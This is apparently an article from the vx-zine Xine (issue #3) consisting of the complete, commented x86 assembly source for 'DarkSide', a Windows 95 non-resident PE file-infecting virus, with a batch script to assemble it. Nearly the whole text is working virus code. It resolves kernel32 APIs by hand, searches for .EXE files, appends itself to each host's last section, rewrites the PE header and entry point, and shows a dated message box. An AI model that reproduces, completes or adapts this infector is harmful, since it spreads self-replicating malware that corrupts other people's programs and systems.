   ;                                        /-----------------------------\
   ;                                        | Xine - issue #3 - Phile 204 |
   ;                                        \-----------------------------/


   ;
   ;
   ;                       DarkSide, by Murkry/IkX
   ;
   ;
   ;  One of my earlier attempts at expanding the Last Section of a PE file
   ; after I heard about Jacky I had to try it out. this virus is buggy but
   ; it works on most PE files.
   ;  Anyway it also shows how to use the host for free Data space and calling
   ; other DLL the KErnel32 (user32) for a MsgBox
   ;
   ;
   ; Since few people had heard of it I figure I could release it again in Xine3.
   ;
   ;
   ;                       DarkSide
   ;
   ; Designed and Built by
   ;       MurKry
   ; For Turmoil ezine
   ; NonResident PE infector
   ; Non Directory Jumping
   ;
   ; Will infect all "normal" PE win95 exe files
   ;  Normal being PE format and base image set to 400000h
   ;   This limation would require just to find where the file was located
   ;   memory, not the offset but the Base not a big deal but I am
   ;   busy so it will stay this the next virus will include this feature
   ;
   ; Uses the unint'ed Data area of the first data section it finds
   ;       but must have a minium of  600h bytes free
   ; this means it can infect a file that it can not jump from,
   ; due to the 600h limations
   ;
   ; Will display a Message box on March 9 bad day for me some years ago :)
   ;
   ; Use a simple GetProc routine to find the Address of several API calls
   ;       including the CallVxd0 routine which is used to access the
   ;       current date, why?  why not. There are better but not easier ways
   ;       Int21 lives on
   ; Well for those who have not played with the VxdCall0 int21
   ; not sure, if the API file read file write do this but I have written
   ; a routine using the fact that if you use the int 21 read\write file
   ; you can read the file into READ only area like 0BFF70000H or other
   ; READ only areas. If you do not see it yet this can enable a nonVXD way
   ; of going TSR in Win95!!!  Anyway my routine just call BEEP but it was
   ; called whenever the CreatProccessA was called Sadly this was only called
   ; in my limited testing when I used a debugger, never when Win95 called the
   ; the API. So this could be made into a virus that only infect when debuggers
   ; or when a process Spawned another Process.
   ; Enough chatter enjoy :)
   ;
   ; Thanks to the Members of LT for letting this humble submision join there
   ; Zine.
   ; Thanks to Yosha for Bug testing for me :-)
   ; I am quite sure there are other bugs but hey this is still a new area for
   ; most of us ;)
   ;
   ; make below into a .Bat file to compile
   ; Due to a bug i left in this sometimes this will
   ; infect itself and then its dead (I have no marker in Generation One
   ; So I renamed it to a .com file so this will not happen
   ;
   ;
   ;-----------bat file to compile
   ;
   ; tasm32 /ml /m3 Dark,,;
   ; tlink32 /Tpe /aa /c  Dark,Dark,, import32.lib
   ; del Dark.com
   ; ren Dark.exe Dark.com


   .386
   locals
   jumps
   .model flat ,stdcall

   ;----------------------------------------
   ;define the API calls that the host makes
   extrn           ExitProcess:PROC
   extrn           Beep:PROC
   ;----------------------------------------
   ;----------------------------------------
   Viruslen        equ     (EndViri - offset HOST  )

   K32             equ     0BFF70000H         ;LOCATION OF THE KERNEL32
                                              ;MODULE FOR WIN95
   ;----------------------------------------

   ;BELOW IS THE DATA AREA EQU FOR THE VIRUS
   ;ESI SHOULD POINT TO A  START OF A MIN OF 600K R/W DATA AREA (I HOPE :> )
   OrginIP         equ      00h            ;store the orginal ip here
   XXXX            equ      04h

   Counter         equ      08h            ;used as a counter
   SrchHdle        equ      0Ch            ;Srch handle for the
   FleHdle         equ      010h           ;File handle
   Vsize           equ      014h           ;holds the VirtualSize of the virus
   PElocation      equ      018h           ; where PE header start
   LocOfOldIP      equ      01Ch           ;where we will place the old ip
   OldIP           equ      020h           ;Area to hold it b4 we write it
   NewIP           equ      024h           ;NewIP

   VxDCall         equ      028h           ;BFF713D4
   Create          equ      02Ch           ;BFF77817
   Close           equ      030h           ;BFF980CF
   Read            equ      034h           ;BFF75806
   FFirst          equ      038h           ;BFF77893
   FNext           equ      03Ch           ;BFF778CB
   Write           equ      040h           ;BFF7580D
   Seek            equ      044H           ;BFFC16F8
   GetMod          equ      048h           ;               lloadBFF77433
   GetProc         equ      04Ch           ;BFF76C18

   AddFunc         equ      050h
   AddName         equ      054h
   AddOrd          Equ      058h
   baseF           Equ      05Ch
   Export          Equ      060h
   Nindex          equ      064h
   limit           equ      068h
   MessBox         equ      06Ch
   ExeFile         equ      070h   ;'*.EXE,0 ;2a2e4558 45 00 00 00
   Readin          equ      078h   ;#bytes read by the file read
   filler          equ      07ch
   ;left open for other things ;)

   SRCH            EQU      0C0H            ;length 139h I think ;)

   ;should end around 1a1h
   ;Used to read the header of the PE file 400h (1024) gives enough
   ;room for most PE files

   BUFFER          equ     200H            ;buffer  for read write area
                                           ; this leaves 400h free
                                           ; or 1024D for us decimal users
   ;---------------------------------------------------------------------
   ;---------------------------------------------------------------------
   ; not used
   .data                                        ;the data area
   storage         dd      4 dup(0)
   ;---------------------------------------------------------------------
   ;---------------------------------------------------------------------


   .code                                   ;executable code starts here

   HOST:
           pushad                  ;store everthing
           push   eax              ;the IP of the virus


           ;here we are modifing the store EAX in the stack so we can
           ;use it as a jump to return the host later
           ;warning this will crash horrible in a non Win95 setup
           ; I suspect it is not  true in other
           ; OS (NT) that
           ; eax = the entry point on start up or that the program is loaded at
           ;400000h
           ; On infect the virii checks if the image base is 400000
           ; so the virus should be ok --I hope


           mov     edx,offset oldip - offset HOST
           add     edx,eax                      ;
           mov     eax,[edx]
           add     eax,0400000h
           mov     [esp + 20h],eax         ;fix the eax be 4 so we can return
                                           ; to the host

           CALL   GetDataSpace             ;just checks for some empty
                                           ;space note the routine will
                                           ; fail if the image base is no
                                           ;00400000 if esi = 0 then it
                                           ; failed

           OR     ESI,ESI          ;check if we found enough memory
           JZ     NotWinPopx       ;for us to play with

           pop     dword ptr [esi + OrginIP]       ;store the start point
                                                   ;here eax in win95 = EIP
           push    esi
           pop     ebp                             ; stores are data here
                                                   ;

           CAll     GetAddress                     ;we assume all is ok
           jmp     GotAddress                      ; here

   ;====================================================================
   ;these are all the items the virus will import
   ; and the dll other than kernel 32

   CR      db      'CreateFileA',0
   Clo     db      '_lclose',0
   RF      db      'ReadFile',0
   FF      db      'FindFirstFileA',0
   FN      db      'FindNextFileA',0
   WF      db      'WriteFile',0
   SK      db      'SetFilePointer',0
   GM      db      'LoadLibraryA',0             ;'GetModuleHandleA',0
   GetPr   db      'GetProcAddress',0
   User    db      'USER32',0
   Messb   db      'MessageBoxA',0

   ;====================================================================

   GotAddress:
           OR     ESI,ESI          ;check if we had a problem
           JnZ    Win95

   NotWinPopx:
            pop     eax
   NotWin95:

            jmp     fini           ;alldone leave the rest to the host

   ;-----------------------------------------------------------------
   Win95:

            call   CheckDate       ;uses the VxDcall to checkthe
                                   ;date
            cmp    eax,1
            jne    NotToday        ;no display today

            call   MessShow        ;display
            cmp    eax,6           ;hey they agree user pressed yes
            je     fini            ;so give them a break
                                   ;so on this date we might not infect
                                   ; if the user agrees :)
   NotToday:

   ;ok now just do a typical find first find next to infect something

           call    GetFile        ;find file
           jmp     FileFirst1

   TryTryAgain:
           call    GetNextF

   FileFirst1:
           cmp     eax,0
           je      NoFile

           call    CheckFile               ;check is pe and
                                           ;and if so returns with
                                           ;loation of PE header
           cmp     eax,0

           jne     fileok

           call    FileClose               ;was not good
           jmp     TryTryAgain             ;get out

   fileok:

           call    InfectIt                ;well is file was ok try to infect


           cmp     eax,0
           je      TryTryAgain

   CloseFile:
           Call    FileClose
   NoFile:

   fini:

           popad                   ;
           jmp     eax             ;

   ;-------------------------------------------------------------
   ;if we reach here we know the file is open
   ;its a PE non infected
   ;murk
   ; 1 check if the last header is in our buffer and that the last
   ;    header is the end of the file should always be but ya never know ;)
   ; 2 Write ourselves to the end of the file
   ; 3 update the Header for our size and the flags should be 'or' with
   ;    with the code\exec flags so it can run
   ; 4 Update the rva for the entry point should be able to use the old
   ;       Vsize + VAddress = new Entry point
   ;       update the Size of code field in the PE
   ;
   ;
   InfectIt:

          mov      eax,[ ebp + SRCH + 20h]       ;size of the exe
          Call     FileSeek

          ;ok we are at the end of the file
          ;now write ourselve there
          ;but we need to keep the file alignment nonsense so
          ;some calculations first

           ;lets get the oldIP

           mov     esi,[ebp + PElocation]          ;esi holds the PE start

           mov     eax,[ESI + 28h]                 ;eip RVA
           MOV     [EBP + OldIP],eax


           mov     eax, Viruslen - 1
           mov     ecx, [esi + 3ch]        ;file align is 3ch

           add     eax,ecx                 ;
           xor     edx,edx
           div     ecx
           mul     ecx

           push    eax                     ;this is how much we are
                                           ;writing with the buffer
           pop     ecx
           mov     dword ptr[ebp + Vsize],ecx

           add     dword ptr[esi + 50h], ecx        ;fix the image size

   ;ok write the virus out to the file
           mov     ecx, Viruslen
           mov     edx,dword ptr [ebp + OrginIP]   ;get what we are writing
           call    FileWrite                       ;write this to the end

   ;now write the oldip out to the file
           mov     ecx,8                           ;we want to write the
           mov     edx,ebp                         ;old ip at the end of the
           add     edx,OldIP                       ;virus
           call    FileWrite                       ;

   ;write the padding out to the file to bring it up to specs for the
   ; file alignment
           mov     edx,400400h                     ;some random bytes to flesh
           mov     ecx,dword ptr[ebp + Vsize]      ;it out
           sub     ecx,Viruslen + 8
           call    FileWrite

           ;ok we need to fix the PE header and Section Header now
           ;first get last section header
           ;section hdr size       = 28h
           ;pe size                = f8h
           mov     ax, word ptr [esi + 6]
           cwde

           dec     eax
           mov     ecx,028h

           mul     ecx
           add     eax,0f8h

           push    esi
           pop     edi             ;points to the header
           add     esi,eax         ;esi = last section header
                                   ;which the virus should be in

           cmp     eax,3d8h
           jg      errorInfect

           ;first set new eip  Vaddress +  VsizeRawData
           ;eip
           ;ptr to raw data

           mov     eax,[ ebp + SRCH + 20h]       ;size of the exe

           mov     ecx, [edi + 3ch]        ;file align is 3ch

           xor     edx,edx
           div     ecx


           PUSH    EDX                     ;SAVES THE ODD PART OF THE FILE

           push    eax

           mov     eax,[esi + 14h]         ; ptr to raw data
           div     ecx


           pop     ebx
           sub     ebx,eax
           push    ebx

           mov     eax,[esi + 10h]         ;size of raw data
           dec     eax                     ;
           add     eax,ecx                 ;
           div     ecx                     ;
           push    eax

           pop     ebx                     ;size of section
           pop     eax                     ;left over from file

           sub     eax,ebx                 ;padding at end of file
           mul     ecx

           POP     EBX                     ;ADD THE DIFFRENCE TO THE FILE
           ADD     EAX,EBX

           mov     [ebp +filler],eax
           add     dword ptr[edi + 50h], eax       ;fix image size

           mov     eax,[esi + 0ch]
           add     eax,[esi + 10h] ;Size of raw data
           add     eax,[ebp +filler]

           mov     [edi + 28h],eax         ;sets up the eip

           mov     eax,[ebp + Vsize]
           add     eax,[ebp +filler]

           add     [esi + 8h],eax          ;fix Vsize
           add     [esi + 10h],eax         ;fix size raw data

           or      [esi + 24h],20000020h
           mov     ax,'TL'
           mov     word ptr [ebp + BUFFER + 12h],ax

           xor      eax,eax                 ;move pointer start of file
           Call     FileSeek                ;to update header



           mov     ecx,400h                        ;we want to write the
           mov     edx,ebp                         ;old ip at the end of the
           add     edx,BUFFER                      ;virus
           call    FileWrite                       ;




           ret

   errorInfect:
           xor     eax,eax
           ret

   ;---------------------------------------------------------------------------
   ;eax = the distance from the start end existing
   ; we want to move pointer

   FileSeek:
           push    LARGE 0                         ;from where do we seek

           push    LARGE 0                  ;high dword of where we search to

           push    eax                      ;low dword

           push    dword ptr [ebp + FleHdle]
           call    dword ptr [EBP + Seek]
           ret

   ;-------------------------------------------------------------------
   FileClose:
           push    DWORD PTR [ebp + FleHdle]
           CALL    DWORD PTR [EBP + Close]
           ret
   ;-------------------------------------------------------------------
   ;       Pass in ecx amount we want to read
   ;               edx where to write it too
   ;
   FileWrite:
           push    LARGE 0                         ;needed to set to null (0)
                                                   ;for our needs

           LEA     eax,[ebp + Readin]             ;this will hold how many
           push    eax                             ;bytes actualy written

           push    ecx                             ;how many bytes

           push    edx                             ;buffer to read data from

           push    dword ptr [ebp + FleHdle]       ;file handle
           call    dword ptr [ebp + Write]          ;call the Read api

                                                   ;if no prob then eax = true 1
                                                   ;else set to 0 for false
           or      eax,eax                         ;set z if problem
           ret                                     ;
   ;-------------------------------------------------------------------



   ;-------------------------------------------------------------
   ;CheckFile routine will open file
   ;get pe header location and check if already infected
   ;returns 0 if problem
   ;
   CheckFile:
           Call    OpenIt
           cmp     eax,-1                          ;if -1 no good
           je      ChError
           ; ok file is open handle is saved in FleHdle
           ; now the viruses needs to read in 1k if the file
           ; check for PE and infection set the MZ checksum to
           ; LT for the Turmoil Zine

           mov     ecx,400h             ;buffer size
           lea     edx,[ebp + BUFFER]
           Call    ReadFile
           jz      ChError

           ;file header is now in virus BUFFER
           ;check for MZ
           mov     eax,[ebp + BUFFER]
           cmp     ax,'ZM'
           jne     ChError

           ;ok check for PE
           mov     ax,[ebp + BUFFER + 3ch]
           cwde
           add     eax,BUFFER
           add     eax,ebp
           mov     [ebp + PElocation],eax
           push    eax
           pop     esi
           mov     eax,dword ptr [esi]
           cmp     eax,'EP'
           jne     ChError

           ;oops almost forgot check for LT
           mov     ax,word ptr[ebp + BUFFER + 12h]
           cmp     ax,'TL'
           je      ChError

           ;check for files that do not start at
           ; 400000h
           ;
           mov     eax,dword ptr[esi + 34h]        ;IMAGE BASE
           CMP     EAX,400000H
           jne     ChError

           inc     ax              ;make sure eax != 0
           ret

   ChError:
           xor     eax,eax
           Ret


   ;--------------------------------------------------------------------------
   ReadFile:
   ;       Pass in ecx amount we want to read
   ;               edx where to write it too
   ;


           push    LARGE 0                         ;useless to virii

           lea     eax,[ebp + Readin]              ;howmany bytes read in
           push    eax

           push    ecx                             ;try to read this many bytes

           push    edx                             ;to here

           push    dword ptr [ebp + FleHdle]       ; this file handle

           call    dword ptr [ebp + Read]          ;call the api

           or      eax,eax                         ;if problem set z
           ret

   ;------------------------------------------------------------------------



   ;--------------------------------------------------------------------------
   OpenIt:
   ;tries to  open the file if it can the eax = the handle
   ; otherwise eax = -1 (ffffffff )
   ;thats all it does
   ;

           xor     eax,eax

           push    eax

           push    eax

           push    00000003                        ;existing file

           PUSH    eax
           push    eax

           push    0c0000000h                      ;R/W

           lea     eax,[ebp+ SRCH + 02ch]          ;location of file name
           push    eax                             ;in the win95 finddata
                                                   ;structure
           call    dword ptr[ebp + Create]

           mov     [ebp + FleHdle],eax             ;save the handle
           ret

   ;-------------------------------------------------------------------



   ;-------------------------------------------------------------
   ;try to find the file usning FindFile and FindNext
   ;
   GetFile:
           lea     eax,[ebp + SRCH]                ;the find data area
           push    eax                             ;

           lea     edi,[ebp + ExeFile  ]
           push    edi                             ;push the location of
            mov     al,'*'                          ;exe file mask
           cmpsb                                   ;
           je      gotexe                          ;this should never get run
                                                   ;again but ya never know
   ;below is a nice way to waste time and it also puts *.EXE0 into the
   ;correct location in out data block
           dec     edi                     ;after the cmpbs
           call    o1
   o1:     pop     eax
           sub     eax, offset o1  - offset GetFile
           push    eax
           pop     esi
           lodsd                                   ;exe file mask
           add     eax,5784a89dh                   ;now make the bytes at
           stosd                                   ;at o1 =  to '*.EXE'0
           lodsd
           sub     eax,0e84fffbbh
           stosd
   gotexe:
           call    dword ptr [ebp +  FFirst]
           mov     [ebp + SrchHdle],eax

           cmp     eax,-1
           jne     GotOneF

           xor     eax,eax
           ;no file found set eax to 0

   GotOneF:
           ret

   GetNextF:
           inc     dword ptr [EBP + Counter]       ; check how many we did

           lea     eax,[ebp + SRCH]                ;the find data area
           push    eax                             ;

           mov     eax,[ebp + SrchHdle]
           push    eax

           call    dword ptr [ebp +  FNext]

           ;if returns with 0 then no more files
           ;other wise it found one
           jmp     GotOneF

   ;-------------------------------------------------------------

   CheckDate:
           ;for the hell of it use int 21 to do this

           mov     eax,00002a00h
           call    INT_21
           xor     eax,eax

           cmp     dh,03   ;march
           jne     CDRET   ;
           cmp     dl,09   ;ninth
           jne     CDRET   ;
           inc     eax

   CDRET:
           ret
   ;-------------------------------------------------------------
   INT_21:
           push    ecx
           push    eax
           push    002a0010h

           call    dword ptr [ebp + VxDCall]

           RET

   ;vxd0            dd      0bff713d4h     ;this is the addresss for the
                                           ;vxdcall0
   ;get_21          dd      002a0010h      ;this is the 2a = Vwin32 10 = the int21
                                           ;routine

   ;------------------------------------------------------------------------------


   NameD           db      '         DarkSide',0

   Warning         db      '     Nothing Going to ', 0Dh
                   db      ' Save you From a Love', 0Dh
                   db      "             that's Blind", 0dh

                   db      '               Slip to the', 0Dh
                   db      '               DarkSide', 0Dh
                   db      '   and Cross that Line',0Dh,0Dh

                   db      '       March 9, 1986',0

   MessShow:

            mov    eax,1024h       ;gives me a question mark
                                   ;2 yes/no buttons
                                   ;and in front
            push   eax

            mov    eax,offset NameD - offset HOST
            add    eax,[ebp + OrginIP]
            push   eax

            add    eax, offset Warning - offset NameD
            push   eax

            xor    eax,eax
            push   eax

            call   dword ptr [MessBox +ebp]
            ;note that eax will equal 6 for yes,  7 for no
            ret

   ;-------------------------------------------------------------------------------
   ; onreturn will have
   ; ESI = the start of a 4k area of r\w data that the virus can use
   ; eax = the data location to use

   GetDataSpace:

           mov     eax,00004550H       ;check for PE00
           mov     edi, 00400000h
           repne   scasd               ;
           jne     NotWin95A

           xchg    edi,esi

           lodsw                           ; ok we are at header + 4
                                           ; now we are at 6
           lodsw                           ; ax = the number of sections
                                           ;peheader + 8

           xor     ecx,ecx                 ;get the number of sections
           mov     ecx,eax                 ;

           add     esi,0f8h - 8            ;get to the section header
                                           ;

           ;esi points to the first section header

   TryNext:
           cmp     ecx,0
           jz      NotWin95A

           mov     eax,[esi + 24h]         ;flags
           and     eax,0c0000000h
           cmp     eax,0c0000000h
           jne      NextOne1

           mov     eax,[esi + 8h]          ;virtual size
           xor     edx,edx

           mov     ebx,4095
           add     eax,ebx
           inc     ebx
           div     ebx
           mul     ebx

           sub     eax,[esi + 10h]         ;size of raw data
           cmp     eax,600h
           jge     OkSpace


   NextOne1:
           add     esi,28h
           loop    TryNext
           jmp     NotWin95A

   OkSpace:
           mov     eax,[esi + 0ch]         ;virtual address
           add     eax,[esi + 10h]         ;size of raw data
           add     eax,00400000h
           push    eax
           pop     esi
           ret

   NotWin95A:
           xor     esi,esi
           ret


    ;end of GetDataSpace
   ;-----------------------------------------------------------
   ;-----------------------------------------------------------
   ;returns with the VxDcall fill with the correct location
   ;or again esi = 0 if failed
   ;
   ;

   GetAddress:

                   XOR     EAX,EAX
                   MOV     ESI,K32 + 3CH       ;points to the New Header
                   LODSW

         ;ESI = THE PE HEADER START of the Kernel32

           ADD     EAX,K32
           CMP     DWORD PTR [EAX],00004550H       ;check for PE00
           JE      NoERROR

   ERROR:  JMP    NotWin95A

   ;ESI SHOULD HOLD THE POINTER TO THE
   ;RVA TO THE EXPORT DIRECTORY

   NoERROR:
           MOV     ESI,[EAX + 78H]         ; 78H = THE EXPORT RVA
           ADD     ESI,K32
           mov     [ebp + Export],esi
           add     esi, 10H                ;

           LODSD                           ;

           mov     [ebp + baseF],eax       ;base of the functions

           lodsd                           ;Number of Functions

           lodsd                           ;Number of Names
           add     eax,K32                 ;this is to not go past the
           mov     [ebp + limit],eax       ;end of the search routine


           lodsd                           ;Address of Functions
           add     eax,K32
           mov     [ebp + AddFunc],eax     ;
           lodsd
           add     eax,K32
           mov     [ebp + AddName],eax     ;Address of Names
           lodsd
           add     eax,K32
           mov     [ebp + AddOrd],eax       ;

           mov     esi,[ebp + AddFunc]
           lodsd
           add     eax,K32
           mov     [ebp + VxDCall],eax     ; get the first routine which is
                                           ; the VxDCall

   ;ok we ha ve everthing we need to go ahead and locate the address's of the
   ;KERNEL32.dll functions

           mov     ebx,offset GetPr - offset HOST ;gets the Routine we
           add     ebx,[ebp + OrginIP]                ;are looking for


   LookLoop:
           mov     esi,[ebp + AddName]     ;get the first rva pointer to a name
           mov     [ebp + Nindex],esi      ;index into the name array

           mov     edi,[esi]               ;now make it a true pointer to the
           add     edi,K32                 ;name by adding the offset

           mov     ecx,0                   ;sets the     counter to 0


   TryAgain:
           mov     esi,ebx                 ;what function we are looking for
                                           ;now simple cmp strs
   MatchByte:
           cmpsb
           jne      NextOne                ;not it try next nameof fucntion

           cmp     byte ptr [edi],0        ;if equal to 0 we found a match
           je      GotIt                   ;

           jmp     MatchByte               ;nope try next byte

   NextOne:
          inc      cx
          cmp      cx,[ebp + limit]
          jge      not_found

          add      dword ptr [ebp + Nindex],4      ;get the next pointer rva
          mov      esi,[ebp + Nindex]              ;and try again
          mov      edi,[esi]                       ;
          add      edi,K32                         ;
          jmp       TryAgain                       ;

   ;---------------------------------------------------------------------
   GotIt:
   ;note if not a match is found the all other from then on in are blank
   ;in other words dont mispell ,or ask for for a function that is not in
   ; KERNEL32
   ;esi = the 0 at the end of the name of the strings given to us to look for
   ;
   ;cx = the index into the AddOrd
   ;take Nindex * 4 + [AddOrd] = Ordinal
   ;Ordinal * 4 + [AddFunc] should be the rva to the fuction

           mov     ebx,esi         ;get set for next search routine
           inc     ebx             ;

           shl     ecx,1           ;*2 looking into a word array
           mov     Esi,[ebp + AddOrd]
           add     Esi,ecx
           xor     eax,eax
           mov     ax,word ptr [esi]

   ;here ax equals the ordinal - the base
   ;if ordinal is passed to hear then we should be able to skip
   ;searching for a name and hit here
   ;not sure of course but it tested on a few that I tried
   ;

           shl     eax,2                ;*4 looking into a dword array
           mov     esi,[ebp + AddFunc]
           add     Esi,eax

           mov     Edi,dword ptr [esi]
           add     Edi,K32

           mov     [ebp + GetProc],edi

           jmp     over_error

   Not95:
           xor     esi,esi                 ;if the header of the kernel
                                           ;is not there forget it, its not
                                           ; the Win95 we know and love ;)

   not_found:                              ; String pass to us is not a
           xor     edi,edi                 ; valid fucntion name

   over_error:
           mov     ebx,Create                      ;the data area
           mov     edi, offset CR - offset HOST    ;name
           add     edi,[ebp +  OrginIP]

   loopfind:
           push    edi
           push    K32
           call    dword ptr [ebp + GetProc]

           ;inc     eax
           ;mov     edx,dword ptr[eax]
           ;mov     [ebp + ebx],edx
           mov     [ebp + ebx],eax
           add     ebx, +4
           cmp     ebx, GetProc
           je      allDone

           mov     al,0
           repne   scasb
           jmp     loopfind
   allDone:
   ;we might be lucky and have everthing we need now we get the
   ;message box api

           nop
           nop
           nop

           mov     eax,offset User - offset HOST
           add     eax,[ebp + OrginIP]
           push    eax
           call    dword ptr [ebp + GetMod]

           mov     edi,offset Messb - offset HOST
           add     edi,[ebp + OrginIP]

           push    edi                      ;push the offset of theAPI we want
           push    eax                      ; push the handle

           call     dword ptr [ebp + GetProc]
           MOV     [EBP + MessBox],eax             ;save it


   getout:
             ret

   ;YEA HARD CODED <SIGH>

   ;kern            dd      0BFF70000h      ;must add to all rva's





   ;---------------------------------------------------------------------
                   db              'DarKSide'
   EndViri         equ     $
   oldip           dd      offset fini1 -  400000h
   DarkLen         equ     ( EndViri - offset HOST )
   ;

   fini1:
           xor     eax,eax
           push    eax
           push    eax                     ;doesnt matter in 95 what this is
           call    Beep             ;Test

           push    LARGE -1
           ;call    dword ptr edi          ;when I used the routine to locate
                                           ;the ExitProcess address
           call    ExitProcess             ;this simply terminates the program

            end     HOST
